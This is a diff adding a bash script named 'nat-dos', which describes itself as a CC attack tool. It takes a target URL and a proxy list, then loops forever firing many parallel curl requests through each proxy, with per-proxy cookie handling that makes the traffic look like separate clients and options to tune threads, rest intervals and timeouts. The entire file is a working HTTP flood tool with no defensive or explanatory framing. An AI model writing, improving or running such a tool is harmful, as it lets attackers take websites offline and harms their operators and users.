@@ -1,0 +1,81 @@
+#!/bin/bash
+#
+# nat-dos: A simple CC attack tool using proxy written in BaSH
+#
+# .
+# ├── cookies/
+# ├── nat-ddos
+# └── proxylist.txt
+#
+
+function getarg {
+	cat /dev/stdin | awk -F"--$1 " '{print $2}' | awk -F" " '{print $1}'
+}
+
+function run {
+	while true
+	do
+		echo -n "[$(date)] About to send DoS... "
+		for i in $loopstr 
+		do
+			[[ -z $(echo $i | attack $* 2> /dev/stdout) ]] && echo -n "[+$i] " || echo -n "[-$i] " 
+		done
+	[[ -z $nowait ]] && echo -e "\n[$(date)] Rest $rest second..." && sleep $rest || echo
+	[[ ! -z $killcurl ]] && killall -9 curl
+	done
+}
+
+function attack {
+	for p in $(cat $list)
+	do
+			
+  	if [[ ! -z $read_cookie ]]
+		then 
+			[[ ! -e cookies/$p ]] && cookiestr="-c cookies/$p" || cookiestr="-b cookies/$p"
+		else
+			[[ ! -z $cookie_load ]] && cookiestr="-b $cookie_load"
+	fi
+	http_proxy=$p curl $* --max-time $timeout $cookiestr >> /dev/null 2> /dev/null &
+	done
+}
+
+function genloop {
+	i=1
+	thread=$(echo $thread+1 | bc)
+	while [[ $i != $thread ]]
+	do
+		loopstr="$loopstr $i "
+		i=$(echo $i+1 | bc)
+	done 
+	echo $loopstr
+}
+
+function usage {
+	echo "usage: nat-ddos --url <target> --proxys <proxy_list>"
+	echo "                [--nowait] [--rest n] [--killcurl] [--thread n]"
+	echo "                [--load-cookies cookie] [--read-cookies]"
+	echo "                [--proxy-timeout n]"
+	exit 1
+}
+
+target=$(echo $* | getarg url)
+thread=$(echo $* | getarg thread)
+list=$(echo $* | getarg proxys)
+nowait=$(echo $* | grep nowait)
+rest=$(echo $* | getarg rest)
+killcurl=$(echo $* | grep killcurl)
+cookie_load=$(echo $* | getarg load-cookie)
+read_cookies=$(echo $* | grep read-cookies)
+timeout=$(echo $* | getarg proxy-timeout)
+
+[[ -z $thread ]] && thread=5
+[[ -z $timeout ]] && timeout=15
+[[ -z $rest ]] && rest=5
+[[ -z $list || -z $target ]] && usage
+
+loopstr=$(genloop)
+rm -fr cookies 2> /dev/null
+mkdir cookies
+
+echo "[$(date)] Attacking $target with $thread thread(s)"
+run $target
